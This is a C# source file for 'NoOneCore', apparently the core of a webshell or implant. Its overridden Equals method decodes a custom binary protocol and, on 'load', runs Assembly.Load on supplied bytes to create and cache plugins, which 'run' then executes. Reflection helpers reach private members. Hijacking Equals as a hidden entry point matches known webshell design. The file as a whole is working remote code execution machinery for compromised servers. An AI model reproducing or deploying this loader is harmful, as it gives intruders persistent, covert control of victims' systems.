using System;
using System.Collections;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;

namespace dotnet_core
{
    public class NoOneCore
    {
        private const string ACTION = "action";
        private const string PLUGIN = "plugin";
        private const string PLUGIN_BYTES = "pluginBytes";
        private const string ARGS = "args";

        private const string REFRESH = "refresh";
        private const string CLASS_DEFINE = "classDefine";
        private const string CLASS_RUN = "classRun";
        private const string PLUGIN_CACHES = "pluginCaches";
        private const string GLOBAL_CACHES = "globalCaches";

        private const string ACTION_STATUS = "status";
        private const string ACTION_RUN = "run";
        private const string ACTION_LOAD = "load";
        private const string ACTION_CLEAN = "clean";

        private const string CODE = "code";
        private const string ERROR = "error";
        private const string DATA = "data";
        private const int SUCCESS = 0;
        private const int FAILURE = 1;

        // pluginName to pluginObject
        public static readonly ConcurrentDictionary<string, object> loadedPluginCache = new ConcurrentDictionary<string, object>();
        public static readonly ConcurrentDictionary<string, object> globalCaches = new ConcurrentDictionary<string, object>();

        private const byte NULL = 0x00;
        private const byte STRING = 0x01;
        private const byte INTEGER = 0x02;
        private const byte LONG = 0x03;
        private const byte DOUBLE = 0x04;
        private const byte BOOLEAN = 0x05;
        private const byte BYTE_ARRAY = 0x06;
        private const byte LIST = 0x07;
        private const byte OBJECT_ARRAY = 0x08;
        private const byte SET = 0x09;
        private const byte MAP = 0x10;

        public override bool Equals(object obj)
        {
            object[] parameters = obj as object[];
            if (parameters == null || parameters.Length < 2)
            {
                return false;
            }

            byte[] inputBytes = parameters[0] as byte[];
            Stream outputStream = parameters[1] as Stream;
            if (inputBytes != null && outputStream != null)
            {
                Dictionary<string, object> result = new Dictionary<string, object>();
                result[CODE] = SUCCESS;
                Dictionary<string, object> args = new Dictionary<string, object>();
                try
                {
                    args = Deserialize(inputBytes);
                }
                catch (Exception e)
                {
                    result[CODE] = FAILURE;
                    result[ERROR] = GetStackTraceAsString(new InvalidOperationException("args parsed failed, " + e.Message, e));
                }

                object actionValue;
                args.TryGetValue(ACTION, out actionValue);
                string action = actionValue as string;
                if (action != null)
                {
                    try
                    {
                        switch (action)
                        {
                            case ACTION_STATUS:
                                foreach (KeyValuePair<string, object> entry in GetStatus())
                                {
                                    result[entry.Key] = entry.Value;
                                }
                                break;
                            case ACTION_RUN:
                                foreach (KeyValuePair<string, object> entry in Run(args))
                                {
                                    result[entry.Key] = entry.Value;
                                }
                                break;
                            case ACTION_LOAD:
                                object loaded = Load(args, result);
                                result[DATA] = loaded != null;
                                break;
                            case ACTION_CLEAN:
                                loadedPluginCache.Clear();
                                break;
                            default:
                                result[CODE] = FAILURE;
                                result[ERROR] = "action [" + action + "] not supported";
                                break;
                        }
                    }
                    catch (Exception e)
                    {
                        result[CODE] = FAILURE;
                        result[ERROR] = GetStackTraceAsString(new InvalidOperationException("action [" + action + "] run failed, " + e.Message, e));
                    }
                }

                try
                {
                    byte[] bytes = Serialize(result);
                    outputStream.Write(bytes, 0, bytes.Length);
                    outputStream.Flush();
                    outputStream.Close();
                }
                catch
                {
                    // ignored
                }
            }
            return false;
        }

        public override int GetHashCode()
        {
            return base.GetHashCode();
        }

        public Dictionary<string, object> GetStatus()
        {
            Dictionary<string, object> result = new Dictionary<string, object>();
            OrderedSet pluginCaches = new OrderedSet();
            foreach (string plugin in loadedPluginCache.Keys)
            {
                pluginCaches.Add(plugin);
            }
            result[PLUGIN_CACHES] = pluginCaches;
            return result;
        }

        public object Load(Dictionary<string, object> args, Dictionary<string, object> result)
        {
            string plugin = GetString(args, PLUGIN);
            if (string.IsNullOrEmpty(plugin))
            {
                throw new InvalidOperationException("plugin is required");
            }

            byte[] pluginBytes = GetByteArray(args, PLUGIN_BYTES);
            if (pluginBytes == null)
            {
                throw new InvalidOperationException("pluginBytes is required for class loading");
            }

            bool refresh = ParseBoolean(GetObject(args, REFRESH));
            object pluginObj = null;
            if (!refresh)
            {
                loadedPluginCache.TryGetValue(plugin, out pluginObj);
            }

            if (pluginObj == null)
            {
                pluginObj = CreatePlugin(pluginBytes);
                loadedPluginCache[plugin] = pluginObj;
                result[CLASS_DEFINE] = true;
            }

            return pluginObj;
        }

        public Dictionary<string, object> Run(Dictionary<string, object> args)
        {
            Dictionary<string, object> result = new Dictionary<string, object>();
            string plugin = GetString(args, PLUGIN);
            object pluginObj = loadedPluginCache[plugin];

            Dictionary<string, object> map = ToStringObjectDictionary(GetObject(args, ARGS)) ?? new Dictionary<string, object>();
            map[PLUGIN_CACHES] = loadedPluginCache;
            pluginObj.Equals(map);

            object data = null;
            map.TryGetValue("result", out data);
            result[DATA] = data;
            result[CLASS_RUN] = true;
            return result;
        }

        public static byte[] ToByteArray(Stream input)
        {
            MemoryStream output = new MemoryStream();
            byte[] buffer = new byte[4096];
            int len;
            try
            {
                while ((len = input.Read(buffer, 0, buffer.Length)) != 0)
                {
                    output.Write(buffer, 0, len);
                }
            }
            catch (IOException)
            {
                // ignored
            }
            finally
            {
                if (input != null)
                {
                    try
                    {
                        input.Close();
                    }
                    catch (IOException)
                    {
                        // ignored
                    }
                }
            }
            return output.ToArray();
        }

        public static object GetFieldValue(object obj, string fieldName)
        {
            FieldInfo field = GetField(obj, fieldName);
            return field.GetValue(obj is Type ? null : obj);
        }

        public static FieldInfo GetField(object obj, string fieldName)
        {
            if (obj == null)
            {
                throw new ArgumentNullException("obj");
            }

            Type current = obj as Type ?? obj.GetType();
            while (current != null)
            {
                FieldInfo field = current.GetField(
                    fieldName,
                    BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.DeclaredOnly
                );
                if (field != null)
                {
                    return field;
                }
                current = current.BaseType;
            }
            throw new MissingFieldException(fieldName);
        }

        public static object InvokeMethod(object obj, string methodName)
        {
            return InvokeMethod(obj, methodName, null, null);
        }

        public static object InvokeMethod(object obj, string methodName, Type[] paramClazz, object[] param)
        {
            try
            {
                Type current = obj is Type ? (Type)obj : obj.GetType();
                MethodInfo method = null;
                while (current != null && method == null)
                {
                    method = current.GetMethod(
                        methodName,
                        BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.DeclaredOnly,
                        null,
                        paramClazz ?? Type.EmptyTypes,
                        null
                    );
                    current = method == null ? current.BaseType : current;
                }

                if (method == null)
                {
                    throw new MissingMethodException("Method not found: " + methodName);
                }

                return method.Invoke(obj is Type ? null : obj, param);
            }
            catch (Exception e)
            {
                throw new InvalidOperationException("Error invoking method: " + methodName, e);
            }
        }

        public byte[] Serialize(Dictionary<string, object> map)
        {
            MemoryStream output = new MemoryStream();
            WriteMap(output, map);
            return output.ToArray();
        }

        public Dictionary<string, object> Deserialize(byte[] data)
        {
            MemoryStream input = new MemoryStream(data);
            byte type = ReadByte(input);
            if (type == MAP)
            {
                return ReadMap(input);
            }
            throw new IOException("Root object is not a Map.");
        }

        private object CreatePlugin(byte[] pluginBytes)
        {
            Assembly assembly = Assembly.Load(pluginBytes);
            List<Type> pluginTypes = assembly
                .GetExportedTypes()
                .Where(t => t.IsClass && !t.IsAbstract && t.GetConstructor(Type.EmptyTypes) != null)
                .ToList();
            if (pluginTypes.Count != 1)
            {
                throw new InvalidOperationException("plugin assembly must contain exactly one concrete public type");
            }
            object instance = Activator.CreateInstance(pluginTypes[0]);
            if (instance == null)
            {
                throw new InvalidOperationException("plugin instance create failed");
            }
            return instance;
        }

        private static object GetObject(Dictionary<string, object> args, string key)
        {
            object value;
            return args.TryGetValue(key, out value) ? value : null;
        }

        private static string GetString(Dictionary<string, object> args, string key)
        {
            object value = GetObject(args, key);
            return value == null ? null : value as string ?? value.ToString();
        }

        private static byte[] GetByteArray(Dictionary<string, object> args, string key)
        {
            object value = GetObject(args, key);
            return value as byte[];
        }

        private static bool ParseBoolean(object value)
        {
            if (value == null)
            {
                return false;
            }

            if (value is bool)
            {
                return (bool)value;
            }

            bool parsed;
            return bool.TryParse(value.ToString(), out parsed) && parsed;
        }

        private static Dictionary<string, object> ToStringObjectDictionary(object value)
        {
            if (value == null)
            {
                return null;
            }

            Dictionary<string, object> direct = value as Dictionary<string, object>;
            if (direct != null)
            {
                return direct;
            }

            IDictionary<string, object> typed = value as IDictionary<string, object>;
            if (typed != null)
            {
                return new Dictionary<string, object>(typed);
            }

            IDictionary dictionary = value as IDictionary;
            if (dictionary != null)
            {
                Dictionary<string, object> converted = new Dictionary<string, object>(dictionary.Count);
                foreach (DictionaryEntry entry in dictionary)
                {
                    string key = entry.Key as string;
                    if (key == null)
                    {
                        throw new InvalidOperationException("Map key must be string.");
                    }
                    converted[key] = entry.Value;
                }
                return converted;
            }

            throw new InvalidOperationException("args must be a map");
        }

        private void WriteMap(Stream output, IDictionary<string, object> map)
        {
            output.WriteByte(MAP);
            if (map == null)
            {
                WriteInt32(output, 0);
                return;
            }

            WriteInt32(output, map.Count);
            foreach (KeyValuePair<string, object> entry in map)
            {
                WriteUtf(output, entry.Key);
                WriteObject(output, entry.Value);
            }
        }

        private void WriteObject(Stream output, object obj)
        {
            if (obj == null)
            {
                output.WriteByte(NULL);
                return;
            }

            string str = obj as string;
            if (str != null)
            {
                output.WriteByte(STRING);
                WriteUtf(output, str);
                return;
            }

            if (obj is int)
            {
                output.WriteByte(INTEGER);
                WriteInt32(output, (int)obj);
                return;
            }

            if (obj is long)
            {
                output.WriteByte(LONG);
                WriteInt64(output, (long)obj);
                return;
            }

            if (obj is double)
            {
                output.WriteByte(DOUBLE);
                WriteDouble(output, (double)obj);
                return;
            }

            if (obj is bool)
            {
                output.WriteByte(BOOLEAN);
                output.WriteByte((bool)obj ? (byte)1 : (byte)0);
                return;
            }

            byte[] bytes = obj as byte[];
            if (bytes != null)
            {
                output.WriteByte(BYTE_ARRAY);
                WriteInt32(output, bytes.Length);
                output.Write(bytes, 0, bytes.Length);
                return;
            }

            OrderedSet orderedSet = obj as OrderedSet;
            if (orderedSet != null)
            {
                output.WriteByte(SET);
                WriteInt32(output, orderedSet.Count);
                foreach (object item in orderedSet)
                {
                    WriteObject(output, item);
                }
                return;
            }

            if (IsSet(obj))
            {
                output.WriteByte(SET);
                ICollection collection = obj as ICollection;
                int count = collection != null ? collection.Count : ((IEnumerable)obj).Cast<object>().Count();
                WriteInt32(output, count);
                foreach (object item in (IEnumerable)obj)
                {
                    WriteObject(output, item);
                }
                return;
            }

            object[] array = obj as object[];
            if (array != null)
            {
                output.WriteByte(OBJECT_ARRAY);
                WriteInt32(output, array.Length);
                foreach (object item in array)
                {
                    WriteObject(output, item);
                }
                return;
            }

            IList list = obj as IList;
            if (list != null)
            {
                output.WriteByte(LIST);
                WriteInt32(output, list.Count);
                foreach (object item in list)
                {
                    WriteObject(output, item);
                }
                return;
            }

            IDictionary<string, object> genericMap = obj as IDictionary<string, object>;
            if (genericMap != null)
            {
                WriteMap(output, genericMap);
                return;
            }

            IDictionary dictionary = obj as IDictionary;
            if (dictionary != null)
            {
                Dictionary<string, object> converted = new Dictionary<string, object>(dictionary.Count);
                foreach (DictionaryEntry entry in dictionary)
                {
                    string key = entry.Key as string;
                    if (key == null)
                    {
                        throw new InvalidOperationException("Map key must be string.");
                    }
                    converted[key] = entry.Value;
                }
                WriteMap(output, converted);
                return;
            }

            throw new InvalidOperationException("Unsupported type for serialization: " + obj.GetType().FullName);
        }

        private Dictionary<string, object> ReadMap(Stream input)
        {
            int size = ReadInt32(input);
            if (size < 0)
            {
                throw new IOException("Map size can not be negative.");
            }

            Dictionary<string, object> map = new Dictionary<string, object>(size);
            for (int i = 0; i < size; i++)
            {
                string key = ReadUtf(input);
                object value = ReadObject(input);
                map[key] = value;
            }
            return map;
        }

        private object ReadObject(Stream input)
        {
            byte type = ReadByte(input);
            switch (type)
            {
                case NULL:
                    return null;
                case STRING:
                    return ReadUtf(input);
                case INTEGER:
                    return ReadInt32(input);
                case LONG:
                    return ReadInt64(input);
                case DOUBLE:
                    return ReadDouble(input);
                case BOOLEAN:
                    return ReadByte(input) != 0;
                case BYTE_ARRAY:
                    {
                        int len = ReadInt32(input);
                        if (len < 0)
                        {
                            throw new IOException("Byte array length can not be negative.");
                        }
                        byte[] bytes = ReadBytes(input, len);
                        return bytes;
                    }
                case SET:
                    {
                        int setSize = ReadInt32(input);
                        if (setSize < 0)
                        {
                            throw new IOException("Set size can not be negative.");
                        }
                        OrderedSet set = new OrderedSet();
                        for (int i = 0; i < setSize; i++)
                        {
                            set.Add(ReadObject(input));
                        }
                        return set;
                    }
                case LIST:
                    {
                        int listSize = ReadInt32(input);
                        if (listSize < 0)
                        {
                            throw new IOException("List size can not be negative.");
                        }
                        List<object> list = new List<object>(listSize);
                        for (int i = 0; i < listSize; i++)
                        {
                            list.Add(ReadObject(input));
                        }
                        return list;
                    }
                case OBJECT_ARRAY:
                    {
                        int arrayLength = ReadInt32(input);
                        if (arrayLength < 0)
                        {
                            throw new IOException("Array length can not be negative.");
                        }
                        object[] array = new object[arrayLength];
                        for (int i = 0; i < arrayLength; i++)
                        {
                            array[i] = ReadObject(input);
                        }
                        return array;
                    }
                case MAP:
                    return ReadMap(input);
                default:
                    throw new IOException("Unknown data type found in stream: " + type);
            }
        }

        private static bool IsSet(object obj)
        {
            foreach (Type iface in obj.GetType().GetInterfaces())
            {
                if (iface.IsGenericType && iface.GetGenericTypeDefinition() == typeof(ISet<>))
                {
                    return true;
                }
            }
            return false;
        }

        private static byte ReadByte(Stream input)
        {
            int value = input.ReadByte();
            if (value < 0)
            {
                throw new EndOfStreamException();
            }
            return (byte)value;
        }

        private static byte[] ReadBytes(Stream input, int length)
        {
            byte[] bytes = new byte[length];
            int offset = 0;
            while (offset < length)
            {
                int read = input.Read(bytes, offset, length - offset);
                if (read <= 0)
                {
                    throw new EndOfStreamException();
                }
                offset += read;
            }
            return bytes;
        }

        private static void WriteInt32(Stream output, int value)
        {
            output.WriteByte((byte)((value >> 24) & 0xFF));
            output.WriteByte((byte)((value >> 16) & 0xFF));
            output.WriteByte((byte)((value >> 8) & 0xFF));
            output.WriteByte((byte)(value & 0xFF));
        }

        private static int ReadInt32(Stream input)
        {
            byte[] bytes = ReadBytes(input, 4);
            return (bytes[0] << 24) | (bytes[1] << 16) | (bytes[2] << 8) | bytes[3];
        }

        private static void WriteInt64(Stream output, long value)
        {
            output.WriteByte((byte)((value >> 56) & 0xFF));
            output.WriteByte((byte)((value >> 48) & 0xFF));
            output.WriteByte((byte)((value >> 40) & 0xFF));
            output.WriteByte((byte)((value >> 32) & 0xFF));
            output.WriteByte((byte)((value >> 24) & 0xFF));
            output.WriteByte((byte)((value >> 16) & 0xFF));
            output.WriteByte((byte)((value >> 8) & 0xFF));
            output.WriteByte((byte)(value & 0xFF));
        }

        private static long ReadInt64(Stream input)
        {
            byte[] bytes = ReadBytes(input, 8);
            return
                ((long)bytes[0] << 56) |
                ((long)bytes[1] << 48) |
                ((long)bytes[2] << 40) |
                ((long)bytes[3] << 32) |
                ((long)bytes[4] << 24) |
                ((long)bytes[5] << 16) |
                ((long)bytes[6] << 8) |
                bytes[7];
        }

        private static void WriteDouble(Stream output, double value)
        {
            long bits = BitConverter.DoubleToInt64Bits(value);
            WriteInt64(output, bits);
        }

        private static double ReadDouble(Stream input)
        {
            long bits = ReadInt64(input);
            return BitConverter.Int64BitsToDouble(bits);
        }

        private static void WriteUtf(Stream output, string value)
        {
            byte[] utfBytes = EncodeModifiedUtf8(value);
            if (utfBytes.Length > 65535)
            {
                throw new IOException("encoded string too long: " + utfBytes.Length + " bytes");
            }
            output.WriteByte((byte)((utfBytes.Length >> 8) & 0xFF));
            output.WriteByte((byte)(utfBytes.Length & 0xFF));
            output.Write(utfBytes, 0, utfBytes.Length);
        }

        private static string ReadUtf(Stream input)
        {
            int utfLength = (ReadByte(input) << 8) | ReadByte(input);
            byte[] utfBytes = ReadBytes(input, utfLength);
            return DecodeModifiedUtf8(utfBytes);
        }

        private static byte[] EncodeModifiedUtf8(string value)
        {
            if (value == null)
            {
                throw new ArgumentNullException("value");
            }

            List<byte> bytes = new List<byte>(value.Length * 3);
            for (int i = 0; i < value.Length; i++)
            {
                int c = value[i];
                if (c >= 0x0001 && c <= 0x007F)
                {
                    bytes.Add((byte)c);
                }
                else if (c > 0x07FF)
                {
                    bytes.Add((byte)(0xE0 | ((c >> 12) & 0x0F)));
                    bytes.Add((byte)(0x80 | ((c >> 6) & 0x3F)));
                    bytes.Add((byte)(0x80 | (c & 0x3F)));
                }
                else
                {
                    bytes.Add((byte)(0xC0 | ((c >> 6) & 0x1F)));
                    bytes.Add((byte)(0x80 | (c & 0x3F)));
                }
            }
            return bytes.ToArray();
        }

        private static string DecodeModifiedUtf8(byte[] utfBytes)
        {
            char[] chars = new char[utfBytes.Length];
            int charCount = 0;
            int index = 0;
            while (index < utfBytes.Length)
            {
                int b = utfBytes[index] & 0xFF;
                if ((b & 0x80) == 0)
                {
                    index++;
                    chars[charCount++] = (char)b;
                }
                else if ((b & 0xE0) == 0xC0)
                {
                    if (index + 1 >= utfBytes.Length)
                    {
                        throw new IOException("Malformed modified UTF-8 input.");
                    }

                    int b2 = utfBytes[index + 1] & 0xFF;
                    if ((b2 & 0xC0) != 0x80)
                    {
                        throw new IOException("Malformed modified UTF-8 input.");
                    }

                    chars[charCount++] = (char)(((b & 0x1F) << 6) | (b2 & 0x3F));
                    index += 2;
                }
                else if ((b & 0xF0) == 0xE0)
                {
                    if (index + 2 >= utfBytes.Length)
                    {
                        throw new IOException("Malformed modified UTF-8 input.");
                    }

                    int b2 = utfBytes[index + 1] & 0xFF;
                    int b3 = utfBytes[index + 2] & 0xFF;
                    if ((b2 & 0xC0) != 0x80 || (b3 & 0xC0) != 0x80)
                    {
                        throw new IOException("Malformed modified UTF-8 input.");
                    }

                    chars[charCount++] = (char)(((b & 0x0F) << 12) | ((b2 & 0x3F) << 6) | (b3 & 0x3F));
                    index += 3;
                }
                else
                {
                    throw new IOException("Malformed modified UTF-8 input.");
                }
            }
            return new string(chars, 0, charCount);
        }

        private static string GetStackTraceAsString(Exception throwable)
        {
            return throwable.ToString();
        }

        private sealed class OrderedSet : IEnumerable<object>
        {
            private readonly List<object> _items = new List<object>();
            private readonly HashSet<object> _set = new HashSet<object>();

            public int Count
            {
                get { return _items.Count; }
            }

            public void Add(object item)
            {
                if (_set.Add(item))
                {
                    _items.Add(item);
                }
            }

            public IEnumerator<object> GetEnumerator()
            {
                return _items.GetEnumerator();
            }

            IEnumerator IEnumerable.GetEnumerator()
            {
                return _items.GetEnumerator();
            }
        }
    }
}
